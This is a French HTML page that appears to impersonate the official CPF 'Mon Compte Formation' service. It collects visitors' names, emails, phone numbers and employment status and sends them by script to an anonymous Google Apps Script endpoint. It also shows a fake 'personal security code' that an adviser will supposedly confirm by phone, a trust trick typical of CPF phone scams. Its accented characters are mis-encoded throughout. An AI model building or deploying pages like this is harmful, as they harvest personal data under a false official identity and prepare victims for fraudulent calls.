<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CPF - V√©rifiez votre √©ligibilit√©</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; background: #f4f4f8; color: #333; }
    header { background: #003366; color: #fff; padding: 30px 20px; text-align: center; }
    header h1 { margin: 0; font-size: 2rem; }
    .intro, .info, .quote, .reminder { padding: 20px; max-width: 900px; margin: auto; line-height: 1.6; }
    .intro p, .info p, .reminder p { font-size: 1rem; }
    .quote { background-color: #eaf3ff; border-left: 6px solid #003366; margin: 20px auto; font-style: italic; color: #003366; }
    .formations-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 20px; padding: 20px; max-width: 1200px; margin: auto; }
    .formation-card { background: #fff; padding: 16px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    .formation-card img { width: 100%; border-radius: 6px; height: 150px; object-fit: cover; }
    .formation-card h3 { margin-top: 12px; color: #003366; }
    .formation-card p { font-size: 0.95rem; }
    form { background: #fff; padding: 30px; max-width: 600px; margin: 40px auto; border-radius: 10px; box-shadow: 0 3px 20px rgba(0,0,0,0.1); }
    form h2 { text-align: center; color: #003366; margin-bottom: 20px; }
    label { font-weight: 600; display: block; margin-top: 15px; }
    input, select { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; }
    button { margin-top: 20px; background: #e30613; color: white; padding: 14px; width: 100%; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
    button:hover { background: #c00511; }
    .thank-you { display: none; text-align: center; color: green; font-weight: bold; padding: 20px; }
    footer { background: #003366; color: white; padding: 20px; text-align: center; margin-top: 50px; }
  </style>
</head>
<body>

<header>
  <h1>Mon Compte Formation - V√©rifiez votre √©ligibilit√©</h1>
</header>

<div class="intro">
  <p>Le Compte Personnel de Formation (CPF) vous permet de financer une formation professionnelle. Selon votre statut, votre projet, et le type de formation souhait√©e, vous pouvez b√©n√©ficier d'une prise en charge partielle ou totale.</p>
</div>

<div class="info">
  <img src="https://cdn.pixabay.com/photo/2017/09/04/18/41/laptop-2718827_1280.jpg" alt="CPF formation" style="width:100%; border-radius:8px; margin-bottom:20px;">
  <p>Depuis 2023, une participation financi√®re minimale de 100‚Ç¨ est obligatoire pour toute formation financ√©e par le CPF. Cette somme est appel√©e le <strong>reste √† charge</strong>, quel que soit votre solde CPF. Certaines exceptions s'appliquent pour les demandeurs d'emploi ou les personnes en situation de handicap.</p>
</div>

<div class="quote">
  <p>"Investir en soi est la meilleure d√©cision que l'on puisse prendre. Gr√¢ce au CPF, vous pouvez vous former dans le domaine de votre choix avec une prise en charge facilit√©e."</p>
</div>

<div class="formations-grid" id="formations"></div>

<form id="cpfForm">
  <h2>Formulaire de demande CPF</h2>
  <label for="prenom">Pr√©nom *</label>
  <input type="text" id="prenom" name="prenom" required>

  <label for="nom">Nom *</label>
  <input type="text" id="nom" name="nom" required>

  <label for="email">Email *</label>
  <input type="email" id="email" name="email" required>

  <label for="telephone">T√©l√©phone *</label>
  <input type="tel" id="telephone" name="telephone" required>

  <label for="statut">Statut *</label>
  <select id="statut" name="statut" required>
    <option value="Public">Salari√© secteur public</option>
    <option value="Priv√©">Salari√© secteur priv√©</option>
    <option value="Demandeur d'emploi">Demandeur d'emploi</option>
  </select>

  <label for="objectif">Objectif de la formation *</label>
  <select id="objectif" name="objectif" required>
    <option value="Personnel">Personnel</option>
    <option value="Professionnel">Professionnel</option>
  </select>

  <label for="formation">Formation souhait√©e *</label>
  <select id="formation" name="formation" required></select>

  <p style="margin-top:20px; font-size: 0.95rem; color: #555;">
    <strong>Note :</strong> Un conseiller vous contactera afin de faire un point sur votre demande et vous conseiller au mieux. Il vous communiquera √©galement <strong>votre code de s√©curit√© personnel : <span style="color:#e30613">1008</span></strong>.
  </p>

  <button type="submit">Envoyer ma demande</button>
  <div class="thank-you" id="thankYouMessage">Merci pour votre demande ! Vous serez contact√© tr√®s rapidement.</div>
</form>

<div class="reminder">
  <p>üìå <strong>Rappel :</strong> Un reste √† charge obligatoire de 100‚Ç¨ est requis depuis avril 2023 pour toute inscription √† une formation via le CPF.</p>
</div>

<footer>
  <p>&copy; 2025 Organisme de Formation | CPF - Qualiopi - Datadock</p>
</footer>

<script>
  const formations = [
    { titre: "Anglais", desc: "Am√©liorez votre anglais pro.", img: "https://cdn.pixabay.com/photo/2016/02/19/11/53/english-1209649_960_720.jpg" },
    { titre: "Espagnol", desc: "Apprenez l'espagnol pour voyager.", img: "https://cdn.pixabay.com/photo/2017/01/20/00/30/flags-1993661_960_720.jpg" },
    { titre: "Italien", desc: "Langue de culture et d'affaires.", img: "https://cdn.pixabay.com/photo/2018/01/29/09/48/italy-3116755_960_720.jpg" },
    { titre: "Allemand", desc: "Pour √©largir vos opportunit√©s pro.", img: "https://cdn.pixabay.com/photo/2014/04/03/10/16/germany-310492_960_720.png" },
    { titre: "Portugais", desc: "Langue utile pour le voyage.", img: "https://cdn.pixabay.com/photo/2015/04/10/00/41/brazil-715135_960_720.jpg" },
    { titre: "WordPress", desc: "Cr√©ez votre site pro.", img: "https://cdn.pixabay.com/photo/2015/03/26/09/40/wordpress-690438_960_720.jpg" },
    { titre: "Word", desc: "Ma√Ætrisez le traitement de texte.", img: "https://cdn.pixabay.com/photo/2015/12/08/00/28/microsoft-1080600_960_720.jpg" },
    { titre: "Excel", desc: "Analysez vos donn√©es efficacement.", img: "https://cdn.pixabay.com/photo/2017/06/09/09/14/excel-2389217_960_720.jpg" },
    { titre: "PowerPoint", desc: "Pr√©sentations impactantes.", img: "https://cdn.pixabay.com/photo/2016/11/29/02/30/presentation-1869711_960_720.jpg" },
    { titre: "Outils collaboratifs", desc: "Travailler efficacement en √©quipe.", img: "https://cdn.pixabay.com/photo/2016/11/21/15/47/google-1840466_960_720.jpg" },
    { titre: "Intelligence Artificielle", desc: "Initiez-vous √† l'IA.", img: "https://cdn.pixabay.com/photo/2018/02/15/13/23/artificial-intelligence-3158251_960_720.jpg" }
  ];

  const grid = document.getElementById('formations');
  const select = document.getElementById('formation');

  formations.forEach(f => {
    const card = document.createElement('div');
    card.className = 'formation-card';
    card.innerHTML = `<img src="${f.img}" alt="${f.titre}" />
                      <h3>${f.titre}</h3>
                      <p>${f.desc}</p>`;
    grid.appendChild(card);

    const option = document.createElement('option');
    option.value = f.titre;
    option.textContent = f.titre;
    select.appendChild(option);
  });

  document.getElementById('cpfForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const data = {
      prenom: document.getElementById('prenom').value,
      nom: document.getElementById('nom').value,
      email: document.getElementById('email').value,
      telephone: document.getElementById('telephone').value,
      statut: document.getElementById('statut').value,
      objectif: document.getElementById('objectif').value,
      formation: document.getElementById('formation').value
    };

    try {
      await fetch("https://script.google.com/macros/s/AKfycbyPXA-SHsztdadlDlqY9tKCOgAqiTlX0TDsR_buW8Q/exec", {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
      this.reset();
      document.getElementById('thankYouMessage').style.display = 'block';
    } catch (err) {
      alert("Erreur serveur. Veuillez r√©essayer plus tard.");
    }
  });
</script>

</body>
</html>
